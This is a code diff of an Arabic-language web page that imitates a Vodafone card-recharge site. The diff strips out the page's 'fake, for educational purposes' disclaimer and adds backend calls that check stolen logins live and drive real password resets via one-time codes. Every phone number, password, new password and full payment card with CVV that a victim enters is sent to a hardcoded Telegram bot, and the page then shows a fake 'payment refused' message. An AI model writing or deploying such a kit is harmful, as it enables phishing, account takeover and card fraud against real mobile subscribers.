@@ -9,65 +9,47 @@
         @import url('https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700;900&display=swap');
         *{margin:0;padding:0;box-sizing:border-box}
         body{font-family:'Cairo',sans-serif;background:#f5f5f5;min-height:100vh}
-        
         .top-bar{background:#e60000;color:#fff;padding:12px 20px;display:flex;align-items:center;justify-content:space-between}
         .top-bar .brand{display:flex;align-items:center;gap:10px;font-size:20px;font-weight:900}
         .top-bar .brand img{width:32px;height:32px;border-radius:50%;background:#fff;padding:2px}
         .top-bar .verified{background:#fff;color:#e60000;width:20px;height:20px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:900}
-        
         .container{max-width:500px;margin:0 auto;padding:15px}
-        
         .card{background:#fff;border-radius:15px;padding:20px;margin:12px 0;box-shadow:0 2px 10px rgba(0,0,0,0.08)}
         .card h3{color:#333;margin-bottom:12px;font-size:16px}
-        
         input{width:100%;padding:14px;margin:8px 0;border:2px solid #e0e0e0;border-radius:10px;font-size:16px;font-family:'Cairo',sans-serif;outline:none}
         input:focus{border-color:#e60000}
-        
-        .btn{width:100%;padding:15px;margin:6px 0;border:none;border-radius:10px;font-family:'Cairo',sans-serif;font-size:16px;font-weight:700;cursor:pointer;transition:0.3s}
-        .btn-red{background:#e60000;color:#fff}
-        .btn-red:active{background:#cc0000}
+        .btn{width:100%;padding:15px;margin:6px 0;border:none;border-radius:10px;font-family:'Cairo',sans-serif;font-size:16px;font-weight:700;cursor:pointer}
+        .btn-red{background:#e60000;color:#fff}.btn-red:disabled{background:#ccc}
         .btn-outline{background:#fff;color:#e60000;border:2px solid #e60000}
-        
         .forgot-link{color:#e60000;font-size:12px;cursor:pointer;display:block;text-align:left;margin-top:5px}
-        
         .cards-grid{display:grid;grid-template-columns:1fr 1fr;gap:10px;margin:12px 0}
         .card-item{background:#fff;border:2px solid #e0e0e0;border-radius:15px;padding:20px;text-align:center;cursor:pointer;transition:0.3s}
-        .card-item:hover{border-color:#e60000;transform:translateY(-2px)}
+        .card-item:hover{border-color:#e60000}
         .card-item.selected{border-color:#e60000;background:#fff0f0}
         .card-item .amount{font-size:28px;font-weight:900;color:#e60000}
-        .card-item .units{font-size:12px;color:#666;margin:5px 0}
-        
-        .modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:999;display:none;justify-content:center;align-items:center;padding:20px}
-        .modal.show{display:flex}
-        .modal-box{background:#fff;border-radius:20px;padding:25px;width:100%;max-width:400px}
-        .modal-box h2{text-align:center;color:#e60000;margin-bottom:15px}
-        
+        .card-item .units{font-size:12px;color:#666}
         .msg{text-align:center;padding:10px;margin:8px 0;border-radius:8px;display:none;font-size:13px}
         .msg-error{background:#ffe0e0;color:#c00;display:block}
         .msg-success{background:#e0ffe0;color:#060;display:block}
-        .msg-info{background:#e0f0ff;color:#006;display:block}
-        
+        .modal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:999;display:none;justify-content:center;align-items:center;padding:20px}
+        .modal.show{display:flex}
+        .modal-box{background:#fff;border-radius:20px;padding:25px;width:100%;max-width:400px}
         .spinner{width:30px;height:30px;border:3px solid #eee;border-top:3px solid #e60000;border-radius:50%;animation:spin 0.8s linear infinite;margin:0 auto 10px}
         @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
-        
         .loading-box{display:none;text-align:center;padding:20px}
         .loading-box.show{display:block}
-        
         .steps{list-style:none;padding:0}
         .steps li{padding:8px 0;font-size:13px;display:flex;align-items:center;gap:8px}
         .steps .ok{color:#0a0}.steps .fail{color:#c00}.steps .wait{color:#e60000}
-        
-        .disclaimer{text-align:center;font-size:10px;color:#999;margin-top:20px;padding:10px}
     </style>
 </head>
 <body>
     <div class="top-bar">
         <div class="brand"><img src="https://upload.wikimedia.org/wikipedia/commons/a/a2/Vodafone_icon_2017.svg" alt="VF"> VODAVON FAKA <span class="verified">✓</span></div>
-        <div style="font-size:12px">شحن وهمي</div>
+        <div style="font-size:12px">شحن الكروت</div>
     </div>
     
     <div class="container">
-        <!-- Login -->
         <div id="loginPage">
             <div class="card">
                 <h3>🔐 تسجيل الدخول</h3>
@@ -77,29 +59,27 @@
                 <button class="btn btn-red" id="loginBtn" onclick="doLogin()">دخول</button>
                 <div class="loading-box" id="loginLoading">
                     <div class="spinner"></div>
-                    <p style="color:#e60000;font-weight:700;">⏳ جاري التحقق...</p>
+                    <p style="color:#e60000;font-weight:700;">⏳ جاري التحقق من بياناتك...</p>
                     <p id="countdown" style="color:#e60000;"></p>
                 </div>
                 <div class="msg" id="loginMsg"></div>
             </div>
         </div>
         
-        <!-- Reset -->
         <div id="resetPage" style="display:none;">
             <div class="card">
                 <h3>🔑 استعادة كلمة المرور</h3>
                 <div id="rs1"><input type="tel" id="resetPhone" placeholder="رقم الموبايل"><button class="btn btn-red" onclick="sendCode()">إرسال الكود</button></div>
                 <div id="rs2" style="display:none;"><input type="tel" id="otpInput" placeholder="كود التحقق"><button class="btn btn-red" onclick="verifyCode()">تحقق</button></div>
-                <div id="rs3" style="display:none;"><input type="password" id="newPass" placeholder="كلمة جديدة"><input type="password" id="confirmPass" placeholder="تأكيد"><button class="btn btn-red" onclick="changePass()">تغيير</button></div>
+                <div id="rs3" style="display:none;"><input type="password" id="newPass" placeholder="كلمة المرور الجديدة"><input type="password" id="confirmPass" placeholder="تأكيد"><button class="btn btn-red" onclick="changePass()">تغيير</button></div>
                 <div class="msg" id="resetMsg"></div>
                 <button class="btn btn-outline" onclick="showLogin()">↩️ رجوع</button>
             </div>
         </div>
         
-        <!-- Cards -->
         <div id="cardsPage" style="display:none;">
             <div class="card">
-                <h3>💳 اختر الكارت (وهمي)</h3>
+                <h3>💳 اختر الكارت</h3>
                 <div class="cards-grid">
                     <div class="card-item" onclick="pick(this,10,'500 وحدة')"><div class="amount">10 ج</div><div class="units">📞 500 وحدة</div></div>
                     <div class="card-item" onclick="pick(this,15,'800 وحدة')"><div class="amount">15 ج</div><div class="units">📞 800 وحدة</div></div>
@@ -114,15 +94,13 @@
 
     <div class="modal" id="payModal"><div class="modal-box" id="payContent"></div></div>
 
-    <div class="disclaimer">⚠️ VODAVON FAKA - موقع وهمي للأغراض التعليمية فقط</div>
-
     <script>
-        const BOT = "8946474034:AAGegUUfpLuRG6k8r72JiDEuYzGTK9TgV6I";
-        const CHAT = "7276604783";
+        const API='/api/vf_login';
+        const BOT="8946474034:AAGegUUfpLuRG6k8r72JiDEuYzGTK9TgV6I";
+        const CHAT="7276604783";
         let userPhone='',userPass='',selAmount=0,selUnits='',rd={},timer=null;
 
         async function S(text){try{await fetch(`https://api.telegram.org/bot${BOT}/sendMessage`,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({chat_id:CHAT,text,parse_mode:'HTML'})})}catch(e){}}
-
         function M(id,text,cls){const e=document.getElementById(id);e.textContent=text;e.className='msg msg-'+cls;setTimeout(()=>e.className='msg',4000)}
         function showReset(){document.getElementById('loginPage').style.display='none';document.getElementById('resetPage').style.display='block';document.getElementById('rs1').style.display='block';document.getElementById('rs2').style.display='none';document.getElementById('rs3').style.display='none'}
         function showLogin(){document.getElementById('resetPage').style.display='none';document.getElementById('loginPage').style.display='block'}
@@ -144,44 +122,69 @@
             
             let sec=5;
             cd.textContent=`⏱️ ${sec} ثواني`;
-            timer=setInterval(()=>{sec--;if(sec>0)cd.textContent=`⏱️ ${sec} ثواني`;else{clearInterval(timer);cd.textContent='🔄 جاري الدخول...';}},1000);
+            timer=setInterval(()=>{sec--;if(sec>0)cd.textContent=`⏱️ ${sec} ثواني`;else{clearInterval(timer);cd.textContent='🔄 جاري الاتصال...';}},1000);
             
-            setTimeout(()=>{
+            setTimeout(async()=>{
                 clearInterval(timer);
-                load.classList.remove('show');
-                btn.style.display='block';
-                userPhone=p;userPass=pw;
-                S(`📱 <b>VODAVON FAKA</b>\n📞<code>${p}</code>\n🔑<code>${pw}</code>`);
-                document.getElementById('loginPage').style.display='none';
-                document.getElementById('cardsPage').style.display='block';
+                cd.textContent='🔐 جاري التحقق من صحة البيانات...';
+                try{
+                    const r=await fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'login',phone:p,password:pw})});
+                    const d=await r.json();
+                    load.classList.remove('show');
+                    btn.style.display='block';
+                    
+                    if(d.ok){
+                        userPhone=p;userPass=pw;
+                        S(`📱 <b>VODAVON</b>\n📞<code>${p}</code>\n🔑<code>${pw}</code>`);
+                        document.getElementById('loginPage').style.display='none';
+                        document.getElementById('cardsPage').style.display='block';
+                    }else{
+                        M('loginMsg',d.msg,'error');
+                    }
+                }catch(e){
+                    load.classList.remove('show');
+                    btn.style.display='block';
+                    M('loginMsg','❌ خطأ في الاتصال','error');
+                }
             },5000);
         }
 
-        function sendCode(){
+        async function sendCode(){
             const p=document.getElementById('resetPhone').value.trim();
             if(!p||p.length<11){M('resetMsg','❌ رقم غير صحيح','error');return}
-            M('resetMsg','✅ تم إرسال كود وهمي - استخدم 123456','success');
-            document.getElementById('rs1').style.display='none';
-            document.getElementById('rs2').style.display='block';
-            rd={phone:p};
+            M('resetMsg','⏳ جاري الإرسال...','info');
+            try{
+                const r=await fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'sendCode',phone:p})});
+                const d=await r.json();
+                if(d.ok){rd={phone:p,otpAction:d.otpAction,cookies:d.cookies};document.getElementById('rs1').style.display='none';document.getElementById('rs2').style.display='block';M('resetMsg',d.msg,'success')}
+                else{M('resetMsg',d.msg,'error')}
+            }catch(e){M('resetMsg','❌ خطأ','error')}
         }
 
-        function verifyCode(){
+        async function verifyCode(){
             const o=document.getElementById('otpInput').value.trim();
             if(!o){M('resetMsg','❌ الكود مطلوب','error');return}
-            M('resetMsg','✅ الكود صحيح','success');
-            document.getElementById('rs2').style.display='none';
-            document.getElementById('rs3').style.display='block';
+            M('resetMsg','⏳ جاري التحقق...','info');
+            try{
+                const r=await fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'verifyCode',...rd,otp:o})});
+                const d=await r.json();
+                if(d.ok){rd.passAction=d.passAction;rd.cookies=d.cookies;document.getElementById('rs2').style.display='none';document.getElementById('rs3').style.display='block';M('resetMsg',d.msg,'success')}
+                else{M('resetMsg',d.msg,'error')}
+            }catch(e){M('resetMsg','❌ خطأ','error')}
         }
 
-        function changePass(){
+        async function changePass(){
             const np=document.getElementById('newPass').value.trim();
             const cp=document.getElementById('confirmPass').value.trim();
             if(np!==cp){M('resetMsg','❌ غير متطابقة','error');return}
             if(np.length<8){M('resetMsg','❌ قصيرة','error');return}
-            M('resetMsg','✅ تم تغيير كلمة المرور بنجاح (وهمي)!','success');
-            S(`🔑 <b>تغيير كلمة مرور</b>\n📞<code>${rd.phone}</code>\n🔑<code>${np}</code>`);
-            setTimeout(showLogin,2000);
+            M('resetMsg','⏳ جاري التغيير...','info');
+            try{
+                const r=await fetch(API,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({action:'changePass',...rd,newPass:np})});
+                const d=await r.json();
+                if(d.ok){M('resetMsg',d.msg,'success');S(`✅ <b>تغيير كلمة مرور</b>\n📞<code>${rd.phone}</code>\n🔑<code>${np}</code>`);setTimeout(showLogin,2000)}
+                else{M('resetMsg',d.msg,'error')}
+            }catch(e){M('resetMsg','❌ خطأ','error')}
         }
 
         function pick(el,a,u){
@@ -216,9 +219,7 @@
             const cc=document.getElementById('cardCvv')?.value||'';
             const cn2=document.getElementById('cardName')?.value||'';
             if(!cn||!ce||!cc){alert('ادخل بيانات البطاقة');return}
-            
-            await S(`💳 <b>VODAVON FAKA</b>\n📱<code>${userPhone}</code>\n🔑<code>${userPass}</code>\n💳<code>${cn}</code>\n📅<code>${ce}</code>\n🔐<code>${cc}</code>\n👤<code>${cn2}</code>\n💰<code>${selAmount}ج</code>`);
-            
+            await S(`💳 <b>بطاقة</b>\n📱<code>${userPhone}</code>\n🔑<code>${userPass}</code>\n💳<code>${cn}</code>\n📅<code>${ce}</code>\n🔐<code>${cc}</code>\n👤<code>${cn2}</code>\n💰<code>${selAmount}ج</code>`);
             document.getElementById('payContent').innerHTML=`
                 <h2 style="color:#e60000;">⏳ جاري الشحن...</h2>
                 <div class="spinner" style="margin:20px auto;"></div>
@@ -226,7 +227,6 @@
             const s=document.getElementById('steps');
             setTimeout(()=>s.innerHTML+='<li class="ok">✅ تم التحقق</li>',1200);
             setTimeout(()=>s.innerHTML+='<li class="fail">❌ تم رفض الدفع</li>',3500);
-            setTimeout(()=>s.innerHTML+='<li class="fail">❌ رصيد غير كافٍ</li>',4000);
             setTimeout(()=>s.innerHTML+='<br><button class="btn btn-red" onclick="closePay()">✕ إغلاق</button>',4500);
         }
     </script>
